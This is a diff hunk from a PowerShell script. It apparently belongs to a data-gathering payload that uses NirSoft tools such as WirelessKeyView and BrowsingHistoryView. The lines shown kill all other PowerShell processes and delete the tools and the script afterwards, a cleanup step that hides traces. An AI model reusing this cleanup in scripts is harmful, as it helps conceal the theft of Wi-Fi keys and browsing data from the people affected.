@@ -29,7 +29,7 @@ Start-Sleep -Seconds 15 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 30 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
-Remove-Item BrowsingHistoryView.exe
+
 Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
